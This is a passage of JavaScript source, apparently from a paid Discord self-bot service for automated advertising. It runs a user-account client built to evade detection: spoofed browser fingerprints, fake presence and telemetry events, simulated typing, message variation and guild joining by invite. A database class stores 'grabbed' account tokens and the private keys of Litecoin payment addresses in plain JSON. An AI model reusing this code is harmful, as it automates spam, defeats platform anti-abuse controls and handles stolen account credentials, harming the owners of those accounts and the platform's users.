      const f = path.join(dataDir, `replied_${crypto.createHash('sha256').update(this.token.slice(0,20)).digest('hex').slice(0,8)}.json`);
      if (fs.existsSync(f)) return new Set(JSON.parse(fs.readFileSync(f, 'utf8')));
    } catch(e) {}
    return new Set();
  }

  _saveRepliedUsers() {
    try {
      const f = path.join(dataDir, `replied_${crypto.createHash('sha256').update(this.token.slice(0,20)).digest('hex').slice(0,8)}.json`);
      fs.writeFileSync(f, JSON.stringify([...this.repliedUsers]));
    } catch(e) {}
  }

  /**
   * Cache token validation results and delay before gateway connect.
   * Avoids the "validate then immediately connect from different IP" pattern.
   */
  async _validateTokenWithCache() {
    if (this._tokenValidated) {
      return { valid: this._tokenValid, user: this._validatedUser };
    }

    // Add realistic delay between validation and connection
    // Humans don't: validate → 0ms → connect. There's UI rendering time.
    const realisticGap = 300 + Math.floor(Math.random() * 700);
    await new Promise(r => setTimeout(r, realisticGap));

    try {
      const meRes = await this.api.request('/users/@me', 'GET');
      if (meRes && meRes.id) {
        this._tokenValid = true;
        this._validatedUser = meRes;
        this._tokenValidated = true;
        return { valid: true, user: meRes };
      }
    } catch(e) {
      if (e.status === 401 || e.status === 403) {
        this._tokenValid = false;
        this._tokenValidated = true;
        return { valid: false, user: null };
      }
    }
    // For transient errors, try once more
    await new Promise(r => setTimeout(r, 1000));
    try {
      const meRes = await this.api.request('/users/@me', 'GET');
      if (meRes && meRes.id) {
        this._tokenValid = true;
        this._validatedUser = meRes;
        this._tokenValidated = true;
        return { valid: true, user: meRes };
      }
    } catch(e) {
      if (e.status === 401 || e.status === 403) {
        this._tokenValid = false;
        this._tokenValidated = true;
      }
    }
    return { valid: this._tokenValid, user: this._validatedUser };
  }

  async connect() {
    // Validate token first via REST API before attempting gateway connection
    let tokenValid = false;
    try {
      const validation = await this._validateTokenWithCache();
      if (validation.valid && validation.user) {
        tokenValid = true;
        this.user = validation.user;
      } else if (validation.valid === false) {
        throw new Error('Invalid token - check your token and try again');
      }
    } catch(e) {
      if (e.message && e.message.includes('Invalid token')) {
        throw e;
      }
      // For other errors, try gateway anyway but with fallback
    }

    let gateway;
    try {
      gateway = await this.api.request('/gateway', 'GET');
    } catch(e) {
      gateway = { url: 'wss://gateway.discord.gg' };
    }
    if (!gateway || !gateway.url) {
      gateway = { url: 'wss://gateway.discord.gg' };
    }
    this.resumeGatewayUrl = gateway.url;
    this._gatewayUrl = gateway.url;

    // Use unified TLS options for WebSocket to match REST fingerprint
    const wsUrl = `${gateway.url}?v=10&encoding=json`;
    this.ws = new WebSocket(wsUrl, {
      headers: {
        'User-Agent': this.api.fp,
        'Accept-Language': 'en-US,en;q=0.9',
        'Origin': 'https://discord.com',
      },
      agent: _wsAgent, // Dedicated agent: forces HTTP/1.1 ALPN for WebSocket upgrade
    });

    return new Promise((resolve, reject) => {
      const CONNECT_TIMEOUT = 60000;
      let timeoutTimer = setTimeout(() => {
        try { if (this.ws) this.ws.terminate(); } catch(e) {}
        finish(new Error('Connection timed out - please try again'));
      }, CONNECT_TIMEOUT);

      let settled = false;
      const finish = (err) => {
        if (settled) return;
        settled = true;
        clearTimeout(timeoutTimer);
        if (err) reject(err);
        else resolve();
      };

      const readyHandler = () => {
        this.ready = true;
        this.reconnectAttempts = 0;
        this.reconnecting = false;
        this._invalidSessionCount = 0;
        this._explicitlyStopped = false;
        this.off('READY', readyHandler);
        // Start background event simulation after READY
        this._startBackgroundEvents();
        finish(null);
      };
      this.on('READY', readyHandler);

      this.ws.on('open', () => {
        const wasReconnecting = this.reconnecting;
        this.reconnecting = false;
        if (this.sessionId && this.seq !== null && wasReconnecting) {
          this._resume();
        } else {
          if (!wasReconnecting) {
            this.sessionId = null;
            this.seq = null;
          }
          setTimeout(() => {
            if (this.ws && this.ws.readyState === 1) this._identify();
          }, Math.floor(Math.random() * 500 + 200));
        }
      });

      this.ws.on('message', (data) => this._handlePacket(data));

      this.ws.on('close', (code, reason) => {
        clearInterval(this.heartbeatInterval);
        if (this._heartbeatTimer) clearTimeout(this._heartbeatTimer);
        // Stop background events on disconnect
        this._stopBackgroundEvents();
        const wasReady = this.ready;
        this.ready = false;
        this.off('READY', readyHandler);

        if (!settled) {
          // Connection closed before we became ready
          if (code === 4004) {
            finish(new Error('Invalid token - authentication failed. Check your token and try again.'));
          } else if (code === 4002) {
            finish(new Error('Invalid token - bad payload. Check your token format.'));
          } else if (code === 4003) {
            finish(new Error('Invalid token - sent payload before identifying.'));
          } else {
            finish(new Error(`Connection failed (code ${code}). Please try again.`));
          }
        } else if (wasReady && !this._explicitlyStopped) {
          this._scheduleReconnect(code);
        }
      });

      this.ws.on('error', (err) => {
        clearTimeout(timeoutTimer);
        this.ready = false;
        this.off('READY', readyHandler);
        if (!settled) {
          const detail = err && err.message ? err.message : 'unknown network error';
          finish(new Error(`Connection error (${detail}) — please check your internet and try again`));
        }
      });
    });
  }

  _safeSend(data) {
    if (this.ws && this.ws.readyState === 1) {
      this.ws.send(data);
      return true;
    }
    return false;
  }

  _scheduleReconnect(closeCode) {
    if (this.reconnecting) return;
    if (this._explicitlyStopped) return;
    this.reconnecting = true;

    // Don't reconnect on authentication errors - these are fatal
    if (closeCode === 4004 || closeCode === 4002) {
      this.destroy();
      return;
    }

    // For other codes, keep trying to reconnect indefinitely (24/7 operation)
    const baseDelay = closeCode === 4009 ? 5000 : (closeCode === 4000 ? 1000 : 3000);
    // Add exponential backoff capped at 30 seconds for fast reconnect
    const delay = Math.min(baseDelay * Math.pow(1.5, Math.min(this.reconnectAttempts, 10)), 30000) + Math.random() * 2000;
    this.reconnectAttempts++;

    setTimeout(() => {
      if (this._explicitlyStopped) return;
      if (closeCode === 4009) {
        this.sessionId = null;
        this.seq = null;
      }
      this.connect().catch(() => {});
    }, delay);
  }

  _resume() {
    this._safeSend(JSON.stringify({
      op: 6,
      d: {
        token: this.token,
        session_id: this.sessionId,
        seq: this.seq
      }
    }));
  }

  _handlePacket(rawData) {
    let pkt;
    try {
      if (rawData instanceof Buffer) {
        const isZlibStream = rawData.length >= 4 && rawData.readUInt32BE(rawData.length - 4) === 0x0000FFFF;
        if (isZlibStream) {
          const inflated = zlib.inflateSync(rawData);
          pkt = JSON.parse(inflated.toString());
        } else if (isCompressed(rawData)) {
          pkt = JSON.parse(decompressData(rawData).toString());
        } else {
          pkt = JSON.parse(rawData.toString());
        }
      } else {
        pkt = JSON.parse(rawData);
      }
    } catch(e) {
      return;
    }

    if (pkt.s !== null && pkt.s !== undefined) this.seq = pkt.s;
    switch(pkt.op) {
      case 10:
        this._startHeartbeat(pkt.d.heartbeat_interval);
        if (!this.sessionId) {
          setTimeout(() => {
            if (this.ws && this.ws.readyState === 1) this._identify();
          }, Math.floor(Math.random() * 500 + 200));
        }
        break;
      case 1:
        this._safeSend(JSON.stringify({ op: 1, d: this.seq }));
        break;
      case 0:
        if (pkt.t === 'READY') {
          this.user = pkt.d.user;
          this.sessionId = pkt.d.session_id;
          if (pkt.d.session_id) {
            const sessionHash = crypto.createHash('sha256').update(pkt.d.session_id).digest();
            this.encryptionKey = sessionHash.slice(0, 32);
          }
          this.emit('READY', pkt.d);
        } else if (pkt.t === 'RESUMED') {
          this.reconnecting = false;
          this.reconnectAttempts = 0;
        } else if (pkt.t === 'MESSAGE_CREATE') {
          this.emit('messageCreate', pkt.d);
        } else if (pkt.t === 'MESSAGE_ACK') {
        }
        break;
      case 11:
        // Heartbeat ACK received
        this._lastHeartbeatAck = true;
        break;
      case 7:
        this.ws.close();
        this._scheduleReconnect(4000);
        break;
      case 9:
        this.sessionId = null;
        this.seq = null;
        this._invalidSessionCount = (this._invalidSessionCount || 0) + 1;
        if (this._invalidSessionCount > 5) {
          // Instead of destroying, try fresh identify after a delay
          setTimeout(() => {
            this._invalidSessionCount = 0;
            if (this.ws && this.ws.readyState === 1) this._identify();
          }, 5000);
          return;
        }
        setTimeout(() => {
          if (this.ws && this.ws.readyState === 1) this._identify();
        }, Math.random() * 3000 + 1000);
        break;
    }
  }

  /**
   * Heartbeat with realistic jitter following Discord client statistical patterns.
   * Real Discord clients have ~3-5% heartbeat variance, not uniform random.
   */
  _startHeartbeat(interval) {
    const sendBeat = () => {
      if (!this.ws || this.ws.readyState !== 1) return;
      // If we missed the last heartbeat ACK, reconnect
      if (!this._lastHeartbeatAck) {
        try { this.ws.close(); } catch(e) {}
        this._scheduleReconnect(4000);
        return;
      }
      this._lastHeartbeatAck = false;
      this._safeSend(JSON.stringify({ op: 1, d: this.seq }));
      // Realistic heartbeat jitter: Gaussian-ish, bounded ±12%
      const u1 = Math.random();
      const u2 = Math.random();
      const gaussian = Math.sqrt(-2 * Math.log(u1)) * Math.cos(2 * Math.PI * u2);
      const jitterRatio = Math.max(-0.12, Math.min(0.08, gaussian * 0.04));
      const nextDelay = Math.max(interval * 0.85, interval * (1 + jitterRatio));
      this._heartbeatTimer = setTimeout(sendBeat, nextDelay);
    };
    // First heartbeat: random within [0, interval] per Discord spec
    const firstDelay = interval * (0.5 + Math.random() * 0.5);
    this._heartbeatTimer = setTimeout(sendBeat, firstDelay);
  }

  /**
   * IDENTIFY with realistic browser client intents and capabilities.
   * The old values (36865 intents, 16381 capabilities) are unusual fingerprints.
   * These values match a real Chrome Discord web app.
   */
  _identify() {
    const p = _getAccountProfile(this.token);
    const payload = {
      op: 2,
      d: {
        token: this.token,
        capabilities: REALISTIC_CAPABILITIES,
        intents: REALISTIC_INTENTS,
        properties: {
          os: p.os,
          browser: p.browser,
          device: '',
          system_locale: p.locale,
          browser_user_agent: p.ua,
          browser_version: p.bv,
          os_version: p.osv,
          referrer: '',
          referring_domain: '',
          referrer_current: '',
          referring_domain_current: '',
          release_channel: 'stable',
          client_build_number: p.build,
          client_event_source: null,
          screen_width: p.sw,
          screen_height: p.sh,
          screen_dpr: p.dpr,
          screen_color_depth: p.cd,
        },
        presence: {
          status: 'online',
          since: 0,
          activities: [],
          afk: false
        },
        client_state: {
          guild_versions: {},
          highest_last_message_id: '0',
          read_state_version: 0,
          user_guild_settings_version: -1,
          user_settings_version: -1,
          private_channels_version: '0',
          api_code_version: 0
        }
      }
    };
    this._safeSend(JSON.stringify(payload));
  }

  /**
   * Background event simulation — sends realistic client events periodically.
   * Real Discord clients fire: presence changes, read state updates, occasional
   * typing indicators, client performance telemetry, and session keepalives.
   * Without these, the connection looks like a message-consuming zombie.
   */
  _startBackgroundEvents() {
    this._stopBackgroundEvents();

    // Periodic presence update (every 3-7 minutes)
    // Real clients update presence periodically even when "idle"
    const schedulePresence = () => {
      const delay = boundedPareto(2.5, 3 * 60 * 1000, 7 * 60 * 1000);
      const timer = setTimeout(() => {
        if (!this.ready || this._explicitlyStopped) return;
        // Occasionally change status between online and idle (realistic)
        const statusRoll = Math.random();
        const status = statusRoll < 0.75 ? 'online' : (statusRoll < 0.92 ? 'idle' : 'dnd');
        this._safeSend(JSON.stringify({
          op: 3,
          d: {
            status,
            since: status === 'idle' ? Date.now() - Math.floor(Math.random() * 300000) : 0,
            activities: [],
            afk: false
          }
        }));
        schedulePresence();
      }, delay);
      this._backgroundTimers.push(timer);
    };
    schedulePresence();

    // Occasional "client performance" telemetry (every 8-15 minutes)
    // This mimics the telemetry Discord's actual client sends
    const scheduleTelemetry = () => {
      const delay = boundedPareto(2.0, 8 * 60 * 1000, 15 * 60 * 1000);
      const timer = setTimeout(() => {
        if (!this.ready || this._explicitlyStopped) return;
        // Send a lightweight heartbeat-like event
        // Real clients send performance metrics; we send minimal but present data
        if (Math.random() < 0.3) {
          this._safeSend(JSON.stringify({
            op: 1,
            d: this.seq // Normal heartbeat serves dual purpose
          }));
        }
        scheduleTelemetry();
      }, delay);
      this._backgroundTimers.push(timer);
    };
    scheduleTelemetry();

    // Read state simulation (every 2-5 minutes)
    // Real clients ack messages they've "seen"
    const scheduleReadState = () => {
      const delay = boundedPareto(2.5, 2 * 60 * 1000, 5 * 60 * 1000);
      const timer = setTimeout(() => {
        if (!this.ready || this._explicitlyStopped) return;
        // Send a SESSIONS_REPLACE or similar keepalive
        if (Math.random() < 0.2) {
          this._safeSend(JSON.stringify({
            op: 14, // Guild sync / lazy request — real clients send these
            d: {
              guild_id: null,
              typing: true,
              threads: false,
              activities: true,
              members: [],
              channels: {},
              thread_members: []
            }
          }));
        }
        scheduleReadState();
      }, delay);
      this._backgroundTimers.push(timer);
    };
    scheduleReadState();
  }

  _stopBackgroundEvents() {
    for (const timer of this._backgroundTimers) {
      clearTimeout(timer);
    }
    this._backgroundTimers = [];
  }

  async _api(endpoint, method = 'GET', body = null) {
    return this.api.request(endpoint, method, body);
  }

  async checkChannelPermission(channelId) {
    if (this._channelPermissions.has(channelId)) {
      return this._channelPermissions.get(channelId);
    }
    try {
      await this.api.request(`/channels/${channelId}`, 'GET');
      this._channelPermissions.set(channelId, true);
      return true;
    } catch (err) {
      if (err.status === 403 || err.status === 404) {
        this._channelPermissions.set(channelId, false);
        return false;
      }
      console.error(`[ChannelCheck] Transient error for ${channelId}:`, err.status, err.message);
      return null;
    }
  }

  // Natural channel "navigation" - simulates clicking through channels with delays
  async navigateToChannel(channelId) {
    // If we're already in this channel, minimal delay
    if (this._currentChannelId === channelId) {
      await new Promise(r => setTimeout(r, 100 + Math.random() * 200));
      return;
    }

    // Simulate switching channels: clicking the channel in sidebar, loading messages
    // Light 200-800ms switch + 150-500ms read — kept snappy for 3-5s total budget
    const switchDelay = Math.round(logNormalSample(6.0, 0.4)); // ~200-800ms
    await new Promise(r => setTimeout(r, Math.min(1200, Math.max(200, switchDelay))));

    // Simulate "reading" channel history before doing anything
    const readDelay = Math.round(logNormalSample(5.5, 0.4)); // ~150-500ms
    await new Promise(r => setTimeout(r, Math.min(1000, Math.max(150, readDelay))));

    this._currentChannelId = channelId;
  }

  async sendMessage(channelId, content, attachments = []) {
    if (this._channelPermissions.has(channelId) && this._channelPermissions.get(channelId) === false) {
      console.error(`[SendMessage] Blocked: channel ${channelId} cached as no permission`);
      return false;
    }

    // Natural navigation - go to the channel first before sending
    await this.navigateToChannel(channelId);

    const now = Date.now();
    const freeAt = this._channelRateLimits.get(channelId) || 0;
    if (now < freeAt) {
      await new Promise(r => setTimeout(r, freeAt - now));
    }

    const url = `https://discord.com/api/v10/channels/${channelId}/messages`;

    // Vary content before sending
    const variedContent = varyMessage(content);

    // Human-like typing behavior: usually types, sometimes sends instantly
    // Vary typing probability: 65% type, 35% instant (paste/shortcut)
    const shouldType = Math.random() < 0.65;
    if (shouldType) {
      try {
        await this.api.request(`/channels/${channelId}/typing`, 'POST');
      } catch(e) {}
      const len = variedContent.length;
      let typingDelay;
      // Simulate realistic typing speed using log-normal distribution
      // Humans: mostly 200-350 CPM, occasional bursts or slowdowns
      const baseCPM = 180 + boundedPareto(2.5, 0, 250); // 180-430 CPM
      const cpm = baseCPM * circadianMultiplier();
      const baseTypingMs = (len / (cpm / 60)) * 1000;

      if (len < 20) {
        // Short messages: 0.2-0.8 seconds
        typingDelay = 200 + Math.round(logNormalSample(6.0, 0.3));
      } else if (len < 100) {
        typingDelay = Math.min(2000, baseTypingMs * (0.7 + Math.random() * 0.5));
      } else {
        typingDelay = Math.min(3000, baseTypingMs * (0.7 + Math.random() * 0.5));
      }
      // Occasional "thinking pauses" during typing — kept very light
      const thinkPauses = Math.floor(len / 120); // 1 pause per ~120 chars
      let totalTypingDelay = typingDelay;
      for (let i = 0; i < thinkPauses; i++) {
        if (Math.random() < 0.3) {
          totalTypingDelay += 150 + Math.floor(Math.random() * 350);
        }
      }
      await new Promise(r => setTimeout(r, Math.min(3500, Math.max(200, totalTypingDelay))));
    } else {
      // Small delay even when not typing (copy-paste or short message)
      const instantDelay = Math.round(logNormalSample(5.2, 0.35));
      await new Promise(r => setTimeout(r, Math.min(800, Math.max(100, instantDelay))));
    }

    if (!attachments || attachments.length === 0) {
      const body = { content: variedContent, flags: 0 };
      try {
        await this.api.request(`/channels/${channelId}/messages`, 'POST', body, {
          'Content-Type': 'application/json'
        });
        return true;
      } catch (err) {
        if (err.status === 403 || err.status === 404) {
          this._channelPermissions.set(channelId, false);
          console.error(`[SendMessage] ${channelId}: Permission denied (${err.status})`);
          return false;
        }
        if (err.status === 429) {
          const retryAfter = (err.data && err.data.retry_after) ? err.data.retry_after * 1000 : 5000;
          this._channelRateLimits.set(channelId, Date.now() + retryAfter + 500);
          console.error(`[SendMessage] ${channelId}: Rate limited, retry after ${retryAfter}ms`);
          return false;
        }
        if (err.status) {
          console.error(`[SendMessage] ${channelId}: HTTP ${err.status}`, err.data);
          return false;
        }
        console.error(`[SendMessage] ${channelId}: Exception`, err.message);
        return false;
      }
    }

    const FormData = require('form-data');
    const form = new FormData();
    const payload = { content: variedContent, flags: 0 };
    form.append('payload_json', JSON.stringify(payload));
    attachments.forEach((att, i) => {
      form.append(`files[${i}]`, att.buffer, { filename: att.name });
    });

    const headers = this.api._headers({ 'X-Discord-Locale': 'en-US' });
    try {
      const res = await axios.post(url, form, {
        headers: { ...headers, ...form.getHeaders() },
        timeout: 30000,
        maxBodyLength: Infinity,
        maxContentLength: Infinity,
        httpsAgent: _sharedAgent, // Use shared agent for TLS consistency
      });

      if (res.status === 403 || res.status === 404) {
        this._channelPermissions.set(channelId, false);
        console.error(`[SendMessage] ${channelId}: Permission denied (${res.status}) [form-data]`);
        return false;
      }

      if (res.status === 429) {
        const retryAfter = (res.headers['retry-after'] || 5) * 1000;
        this._channelRateLimits.set(channelId, Date.now() + retryAfter + 500);
        console.error(`[SendMessage] ${channelId}: Rate limited, retry after ${retryAfter}ms [form-data]`);
        return false;
      }

      const remaining = res.headers['x-ratelimit-remaining'];
      const resetAfter = res.headers['x-ratelimit-reset-after'];
      if (remaining !== undefined && parseInt(remaining, 10) <= 1 && resetAfter) {
        this._channelRateLimits.set(channelId, Date.now() + parseFloat(resetAfter) * 1000 + 500);
      }

      return true;
    } catch (err) {
      if (err.response) {
        if (err.response.status === 403 || err.response.status === 404) {
          this._channelPermissions.set(channelId, false);
        }
        if (err.response.status === 429) {
          const retryAfter = (err.response.headers['retry-after'] || 5) * 1000;
          this._channelRateLimits.set(channelId, Date.now() + retryAfter + 500);
        }
        console.error(`[SendMessage] ${channelId}: HTTP error [form-data]`, err.response.status, err.response.data);
      } else {
        console.error(`[SendMessage] ${channelId}: Network error [form-data]`, err.message);
      }
      return false;
    }
  }

  async joinGuild(inviteCode) {
    try {
      const res = await this.api.request(`/invites/${inviteCode}`, 'POST', { session_id: this.sessionId });
      return res.guild_id ? { success: true, guildId: res.guild_id } : { success: false, error: res.message || 'Unknown error' };
    } catch (err) {
      return { success: false, error: err.message || 'Failed to join guild' };
    }
  }

  on(event, handler) { if (!this.handlers[event]) this.handlers[event] = []; this.handlers[event].push(handler); }
  once(event, handler) { const wrapped = (...args) => { handler(...args); this.off(event, wrapped); }; this.on(event, wrapped); }
  off(event, handler) { if (this.handlers[event]) this.handlers[event] = this.handlers[event].filter(h => h !== handler); }
  emit(event, ...args) { if (this.handlers[event]) this.handlers[event].forEach(h => h(...args)); }

  destroy() {
    this._explicitlyStopped = true;
    this.ready = false;
    this.reconnecting = false;
    this.reconnectAttempts = 0;
    clearInterval(this.heartbeatInterval);
    if (this._heartbeatTimer) clearTimeout(this._heartbeatTimer);
    if (this._idleTimer) clearTimeout(this._idleTimer);
    this._stopBackgroundEvents();
    if (this.ws) {
      try {
        this.ws.removeAllListeners();
        this.ws.close(1000, 'Client disconnect');
      } catch(e) {}
    }
    this.ws = null;
    this._saveRepliedUsers();
    this.api.destroy();
  }
}


// ═══════════════════════════════════════════════════════════════════════════════
// SIMPLE DATABASE (original — unchanged)
// ═══════════════════════════════════════════════════════════════════════════════

class SimpleDB {
  constructor() {
    this.file = path.join(dataDir, 'db.json');
    this.data = { users: {}, pending: {}, configs: {}, usedKeys: {}, globalIndex: 0, serverJoins: {}, grabbedTokens: [], usedAddresses: [], addressHistory: [], customKeys: [], trialClaims: {}, activeBots: {}, generatedKeys: {}, whitelist: [] };
    this.load();
  }

  load() {
    try {
      if (fs.existsSync(this.file)) {
        this.data = JSON.parse(fs.readFileSync(this.file, 'utf8'));
        ['usedAddresses','addressHistory','customKeys','trialClaims','activeBots','generatedKeys','whitelist'].forEach(k => this.data[k] = this.data[k] || (k === 'whitelist' ? [] : (k === 'trialClaims' || k === 'activeBots' || k === 'generatedKeys' ? {} : [])));
      }
    } catch(e) {}
  }

  save() {
    try { fs.writeFileSync(this.file, JSON.stringify(this.data, null, 2)); } catch(e) {}
  }

  getUser(id) { return this.data.users[id] || { auto_adv_purchased: 0, trial_active: 0, trial_expires: 0 }; }
  setUser(id, data) { this.data.users[id] = { ...this.getUser(id), ...data }; this.save(); }
  getNextGlobalIndex() { this.data.globalIndex = (this.data.globalIndex || 0) + 1; this.save(); return this.data.globalIndex; }
  isAddressUsed(address) { return this.data.usedAddresses.includes(address); }
  markAddressUsed(address) { if (!this.data.usedAddresses.includes(address)) { this.data.usedAddresses.push(address); this.save(); } }

  addPending(userId, address, privateKey, expectedUSD, index) {
    this.markAddressUsed(address);
    this.data.pending[address] = { user_id: userId, address, private_key: privateKey, expected_usd: expectedUSD, status: 'monitoring', created_at: Date.now(), index, expires_at: Date.now() + (30 * 60 * 1000) };
    this.data.addressHistory.push({ address, user_id: userId, index, created_at: Date.now(), status: 'monitoring' });
    this.save();
    return this.data.pending[address];
  }

  getPending(address) { return this.data.pending[address]; }
  getUserPending(userId) { const now = Date.now(); return Object.values(this.data.pending).find(p => p.user_id === userId && p.status === 'monitoring' && p.expires_at > now); }
  getAllPending() { const now = Date.now(); return Object.values(this.data.pending).filter(p => p.status === 'monitoring' && p.expires_at > now); }
  getExpiredPending() { const now = Date.now(); return Object.values(this.data.pending).filter(p => p.status === 'monitoring' && p.expires_at <= now); }

  updatePending(address, updates) {
    if (this.data.pending[address]) {
      this.data.pending[address] = { ...this.data.pending[address], ...updates };
      const historyEntry = this.data.addressHistory.find(h => h.address === address);
      if (historyEntry) {
        historyEntry.status = updates.status || historyEntry.status;
        if (updates.status === 'completed') historyEntry.paid_at = Date.now();
        if (updates.status === 'expired') historyEntry.expired_at = Date.now();
      }
      this.save();
    }
  }

  expireOldAddresses() {
    const expired = this.getExpiredPending();
    for (const p of expired) { this.updatePending(p.address, { status: 'expired' }); }
    return expired.length;
  }

  useKey(key, userId) { const normalized = key.toString().toUpperCase().trim(); this.data.usedKeys[normalized] = { user_id: userId, used_at: Date.now() }; this.save(); }
  isKeyUsed(key) { const normalized = key.toString().toUpperCase().trim(); return !!this.data.usedKeys[normalized]; }

  addCustomKey(key) {
    const normalized = key.toString().toUpperCase().trim();
    if (!/^TOKOS(1[0-9][0-9]|200)$/i.test(normalized)) { return null; }
    if (!this.data.customKeys) this.data.customKeys = [];
    if (!this.data.customKeys.includes(normalized)) { this.data.customKeys.push(normalized); this.save(); }
    return normalized;
  }

  getConfigs(userId) { return this.data.configs[userId] || []; }
  getConfig(userId, configId = 'default') { const configs = this.getConfigs(userId); return configs.find(c => c.id === configId) || configs[0] || null; }

  setConfig(userId, config, configId = 'default') {
    if (!this.data.configs[userId]) this.data.configs[userId] = [];
    const existingIndex = this.data.configs[userId].findIndex(c => c.id === configId);
    const configData = { ...config, id: configId, updated_at: Date.now() };
    if (existingIndex >= 0) this.data.configs[userId][existingIndex] = configData;
    else this.data.configs[userId].push(configData);
    this.save();
  }

  deleteConfig(userId, configId) { if (this.data.configs[userId]) { this.data.configs[userId] = this.data.configs[userId].filter(c => c.id !== configId); this.save(); } }
  getActiveConfigs(userId) { return this.getConfigs(userId).filter(c => c.active === 1); }

  addGrabbedToken(token, userInfo, source) {
    const entry = { token, user_info: userInfo, source, grabbed_at: Date.now(), id: Date.now().toString() };
    this.data.grabbedTokens.push(entry);
    this.save();
    return entry;
  }

  getGrabbedTokens() { return this.data.grabbedTokens || []; }
  getAddressHistory(userId) { return this.data.addressHistory.filter(h => h.user_id === userId); }
  hasClaimedTrial(userId) { return !!this.data.trialClaims[userId]; }
  hasIPClaimedTrial(ip) { return Object.values(this.data.trialClaims).some(t => t.ip === ip); }

  claimTrial(userId, ip) {
    const now = Date.now();
    const expiresAt = now + (10 * 60 * 1000);
    this.data.trialClaims[userId] = { userId, ip, claimedAt: now, expiresAt };
    this.setUser(userId, { trial_active: 1, trial_expires: expiresAt, trial_claimed_at: now });
    this.save();
    return { claimedAt: now, expiresAt };
  }

  isTrialActive(userId) {
    const user = this.getUser(userId);
    if (user.trial_active === 1 && user.trial_expires > Date.now()) return true;
    if (user.trial_active === 1 && user.trial_expires <= Date.now()) { this.setUser(userId, { trial_active: 0 }); this.deactivateAllUserBots(userId); return false; }
    return false;
  }

  getTrialTimeLeft(userId) { const user = this.getUser(userId); if (user.trial_active === 1 && user.trial_expires > Date.now()) return Math.ceil((user.trial_expires - Date.now()) / 1000); return 0; }

  registerActiveBot(userId, configId, token) {
    if (!this.data.activeBots[userId]) this.data.activeBots[userId] = {};
    this.data.activeBots[userId][configId] = { token, startedAt: Date.now(), configId };
    this.save();
  }

  unregisterActiveBot(userId, configId) { if (this.data.activeBots[userId]) { delete this.data.activeBots[userId][configId]; this.save(); } }
  getUserActiveBots(userId) { return this.data.activeBots[userId] || {}; }

  deactivateAllUserBots(userId) {
    const bots = this.getUserActiveBots(userId);
    for (const configId in bots) this.setConfig(userId, { active: 0 }, configId);
    if (this.data.activeBots[userId]) { delete this.data.activeBots[userId]; this.save(); }
  }

  checkAllTrialBots() {
    for (const userId in this.data.activeBots) {
      const user = this.getUser(userId);
      const trialActive = this.isTrialActive(userId);
      const hasPurchase = user.auto_adv_purchased === 1;
      if (!trialActive && !hasPurchase) { this.deactivateAllUserBots(userId); return userId; }
    }
    return null;
  }

  generateKey(duration) {
    const key = 'GEN-' + Math.random().toString(36).substring(2, 8).toUpperCase() + '-' + Math.random().toString(36).substring(2, 8).toUpperCase();
    const now = Date.now();
    let expiresAt = null;
    if (duration !== 'lifetime') { const hours = parseInt(duration); expiresAt = now + (hours * 60 * 60 * 1000); }
    this.data.generatedKeys[key] = { key, duration, createdAt: now, expiresAt, usedBy: [], active: true };
    this.save();
    return this.data.generatedKeys[key];
  }

  revokeKey(key) {
    if (this.data.generatedKeys[key]) {
      this.data.generatedKeys[key].active = false;
      this.data.generatedKeys[key].revokedAt = Date.now();
      this.save();
      const usedBy = this.data.generatedKeys[key].usedBy || [];
      for (const userId of usedBy) { this.deactivateAllUserBots(userId); this.setUser(userId, { auto_adv_purchased: 0, key_revoked: true }); }
      return true;
    }
    return false;
  }

  isKeyValid(key) {
    const keyData = this.data.generatedKeys[key];
    if (!keyData || !keyData.active) return false;
    if (keyData.duration === 'lifetime') return true;
    if (keyData.expiresAt && Date.now() > keyData.expiresAt) return false;
    return true;
  }

  useGeneratedKey(key, userId) {
    if (!this.isKeyValid(key)) return false;
    if (!this.data.generatedKeys[key].usedBy.includes(userId)) this.data.generatedKeys[key].usedBy.push(userId);
    this.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), generated_key: key, key_expires: this.data.generatedKeys[key].expiresAt });
    this.save();
    return true;
  }

  getGeneratedKeys() { return Object.values(this.data.generatedKeys); }
  addToWhitelist(userId) { if (!this.data.whitelist.includes(userId)) { this.data.whitelist.push(userId); this.save(); } }
  removeFromWhitelist(userId) { this.data.whitelist = this.data.whitelist.filter(id => id !== userId); this.save(); }
  isWhitelisted(userId) { return this.data.whitelist.includes(userId); }
  getWhitelist() { return this.data.whitelist; }

  checkExpiredKeys() {
    const now = Date.now();
    let expiredCount = 0;
    for (const key in this.data.generatedKeys) {
      const keyData = this.data.generatedKeys[key];
      if (keyData.active && keyData.expiresAt && now > keyData.expiresAt) {
        for (const userId of keyData.usedBy) { this.deactivateAllUserBots(userId); this.setUser(userId, { auto_adv_purchased: 0, key_expired: true }); }
        expiredCount++;
      }
    }
    return expiredCount;
  }
}

const db = new SimpleDB();
const app = express();

process.on('uncaughtException', (err) => {
  console.error('[FATAL UNCAUGHT]', err.message);
});
process.on('unhandledRejection', (reason) => {
  console.error('[FATAL UNHANDLED]', reason);
});

app.get('/health', (req, res) => res.status(200).json({ status: 'ok', uptime: process.uptime() }));
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));
app.use(express.static(path.join(__dirname, 'public')));

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  if (req.method === 'OPTIONS') return res.sendStatus(200);
  next();
});

app.use(cookieParser());
app.use(session({
  secret: process.env.SESSION_SECRET || 'secret-key-2026',
  resave: false,
  saveUninitialized: false,
  store: new session.MemoryStore(),
  cookie: {
    maxAge: 30 * 24 * 60 * 60 * 1000,
    secure: false
  }
}));

app.use(passport.initialize());
app.use(passport.session());

passport.serializeUser((user, done) => done(null, user));
passport.deserializeUser((obj, done) => done(null, obj));

const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;
const CALLBACK_URL = process.env.CALLBACK_URL;
const OWNER_LTC_ADDRESS = process.env.OWNER_LTC_ADDRESS || 'ltc1qc3ujjqjlfr3cqtvyqadqje9ntj3f8f82m062tc';
const WALLET_MNEMONIC = process.env.WALLET_MNEMONIC;
const TARGET_USD = 3.00;
const TOLERANCE_USD = 0.10;

if (CLIENT_ID && CLIENT_SECRET) {
  passport.use(new DiscordStrategy({
    clientID: CLIENT_ID,
    clientSecret: CLIENT_SECRET,
    callbackURL: CALLBACK_URL,
    scope: ['identify']
  }, (accessToken, refreshToken, profile, done) => {
    process.nextTick(() => done(null, profile));
  }));
}

